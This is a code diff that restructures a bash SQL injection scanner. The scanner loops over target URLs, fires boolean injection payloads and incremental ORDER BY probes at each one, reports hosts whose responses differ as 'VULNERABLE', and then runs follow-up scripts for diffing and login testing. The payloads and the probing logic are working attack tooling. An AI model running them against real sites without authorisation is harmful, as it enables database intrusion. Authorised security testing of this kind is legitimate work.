@@ -214,6 +214,28 @@ curl_time() {
   curl "${CURL_ARGS[@]}"
 }
 
+# ---------------- Test payload function ----------------
+test_payload() {
+  local url="$1"
+  local payload="$2"
+  local description="$3"
+  
+  response_code=$(curl_cmd "${url}/${payload}")
+  
+  # Check if response is 200 (true) or not 200 (false)
+  if [[ "$response_code" == "200" ]]; then
+    if [[ "$verbose" == true ]]; then
+      echo -e "${BLUE}[*] Payload '$payload' returned TRUE (200)${NC}" 1>&2
+    fi
+    echo "true"
+  else
+    if [[ "$verbose" == true ]]; then
+      echo -e "${BLUE}[*] Payload '$payload' returned FALSE ($response_code)${NC}" 1>&2
+    fi
+    echo "false"
+  fi
+}
+
 # ---------------- INITIALIZE ---------------
 clear
 if [[ "$verbose" == true ]]; then
@@ -262,58 +284,6 @@ declare -a falsePositiveResponse=(
     "Please turn on JavaScript"
 )
 
-
-
-while IFS= read -r url; do
-  [[ -z "$url" ]] && continue
-  vulnerable=false
-
-  # ---- Stage 0: False positive response check (FIRST check before anything else)
-  body_response=$(curl_body "$url")
-  skip_url=false
-  
-  for pattern in "${falsePositiveResponse[@]}"; do
-    if echo "$body_response" | grep -qi "$pattern"; then
-      echo -e "${YELLOW}[-] Skipping (false positive): $url${NC}"
-      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
-      skip_url=true
-      break
-    fi
-  done
-  
-  if [[ "$skip_url" == true ]]; then
-    continue
-  fi
-
-  # ---- Stage 1: base check (skip dead only)
-  base_code=$(curl_cmd "$url")
-  [[ "$base_code" == "000" ]] && continue
-
-  # ---- Stage 2: boolean injection (multiple payloads)
-vulnerable=false
-
-# Test a single payload for boolean injection
-test_payload() {
-  local url="$1"
-  local payload="$2"
-  local description="$3"
-  
-  response_code=$(curl_cmd "${url}/${payload}")
-  
-  # Check if response is 200 (true) or not 200 (false)
-  if [[ "$response_code" == "200" ]]; then
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Payload '$payload' returned TRUE (200)${NC}" 1>&2
-    fi
-    echo "true"
-  else
-    if [[ "$verbose" == true ]]; then
-      echo -e "${BLUE}[*] Payload '$payload' returned FALSE ($response_code)${NC}" 1>&2
-    fi
-    echo "false"
-  fi
-}
-
 # Array of payloads to test
 declare -a payloads=(
   # Standard boolean injections
@@ -355,77 +325,111 @@ declare -a payloads=(
   "1%20AND%202=1/*comment*/--"
 )
 
-# Store results for comparison
-declare -A payload_results
-declare -a true_payloads=()
-declare -a false_payloads=()
+while IFS= read -r url; do
+  [[ -z "$url" ]] && continue
+  vulnerable=false
 
-# Test all payloads
-if [[ "$verbose" == true ]]; then
-  echo -e "${BLUE}[*] Testing boolean injection payloads...${NC}" 1>&2
-fi
-
-for payload in "${payloads[@]}"; do
-  result=$(test_payload "$url" "$payload" "Boolean test")
-  payload_results["$payload"]="$result"
+  # ---- Stage 0: False positive response check (FIRST check before anything else)
+  body_response=$(curl_body "$url")
+  skip_url=false
   
-  if [[ "$result" == "true" ]]; then
-    true_payloads+=("$payload")
-  else
-    false_payloads+=("$payload")
-  fi
-done
-
-# Check if we have both true and false responses
-if [[ ${#true_payloads[@]} -gt 0 ]] && [[ ${#false_payloads[@]} -gt 0 ]]; then
-  echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-  echo -e "Reason: ${BLUE}Boolean injection detected - different responses for different payloads${NC}"
-  echo -e "${BLUE}  True responses (200):${NC}"
-  for p in "${true_payloads[@]:0:3}"; do  # Show first 3 true payloads
-    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
-  done
-  echo -e "${BLUE}  False responses (not 200):${NC}"
-  for p in "${false_payloads[@]:0:3}"; do  # Show first 3 false payloads
-    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
-  done
-  
-  vulnerable=true
-  
-  # Run additional tests
-  if [[ -n "$header" ]]; then
-    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
-  else
-    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
-  fi
-  
-  "$SCRIPT_DIR/sqlogin.sh" "$url" || true
-
-
-# Additional check: ORDER BY incremental testing
-if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
-  if [[ "$verbose" == true ]]; then
-    echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
-  fi
-  
-  # Test ORDER BY with increasing column numbers
-  for i in {1..20}; do
-    order_payload="%20order%20by%20${i}--%20-"
-    response_code=$(curl_cmd "${url}/${order_payload}")
-    
-    if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]]; then
-      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
-      echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
-      echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
-      vulnerable=true
-      
-      # Run additional tests
-      if [[ -n "$header" ]]; then
-        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
-      else
-        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
-      fi
-      
-      "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+  for pattern in "${falsePositiveResponse[@]}"; do
+    if echo "$body_response" | grep -qi "$pattern"; then
+      echo -e "${YELLOW}[-] Skipping (false positive): $url${NC}"
+      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
+      skip_url=true
       break
     fi
   done
+  
+  if [[ "$skip_url" == true ]]; then
+    continue
+  fi
+
+  # ---- Stage 1: base check (skip dead only)
+  base_code=$(curl_cmd "$url")
+  [[ "$base_code" == "000" ]] && continue
+
+  # ---- Stage 2: boolean injection (multiple payloads)
+  # Store results for comparison
+  declare -A payload_results
+  declare -a true_payloads=()
+  declare -a false_payloads=()
+
+  # Test all payloads
+  if [[ "$verbose" == true ]]; then
+    echo -e "${BLUE}[*] Testing boolean injection payloads...${NC}" 1>&2
+  fi
+
+  for payload in "${payloads[@]}"; do
+    result=$(test_payload "$url" "$payload" "Boolean test")
+    payload_results["$payload"]="$result"
+    
+    if [[ "$result" == "true" ]]; then
+      true_payloads+=("$payload")
+    else
+      false_payloads+=("$payload")
+    fi
+  done
+
+  # Check if we have both true and false responses
+  if [[ ${#true_payloads[@]} -gt 0 ]] && [[ ${#false_payloads[@]} -gt 0 ]]; then
+    echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+    echo -e "Reason: ${BLUE}Boolean injection detected - different responses for different payloads${NC}"
+    echo -e "${BLUE}  True responses (200):${NC}"
+    for p in "${true_payloads[@]:0:3}"; do  # Show first 3 true payloads
+      echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
+    done
+    echo -e "${BLUE}  False responses (not 200):${NC}"
+    for p in "${false_payloads[@]:0:3}"; do  # Show first 3 false payloads
+      echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
+    done
+    
+    vulnerable=true
+    
+    # Run additional tests
+    if [[ -n "$header" ]]; then
+      "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
+    else
+      "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
+    fi
+    
+    "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+  fi
+
+  # ---- Stage 3: Additional check: ORDER BY incremental testing
+  if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
+    if [[ "$verbose" == true ]]; then
+      echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
+    fi
+    
+    # Test ORDER BY with increasing column numbers
+    for i in {1..20}; do
+      order_payload="%20order%20by%20${i}--%20-"
+      response_code=$(curl_cmd "${url}/${order_payload}")
+      
+      if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]] && [[ "$response_code" != "404" ]]; then
+        echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
+        echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
+        echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
+        vulnerable=true
+        
+        # Run additional tests
+        if [[ -n "$header" ]]; then
+          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
+        else
+          "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
+        fi
+        
+        "$SCRIPT_DIR/sqlogin.sh" "$url" || true
+        break
+      fi
+    done
+  fi
+
+  # ---- Final safe output
+  if [[ "$vulnerable" == false ]]; then
+    echo -e "${GREEN}[ ${CHECK} ] $url${NC}"
+  fi
+
+done <<< "$urls"
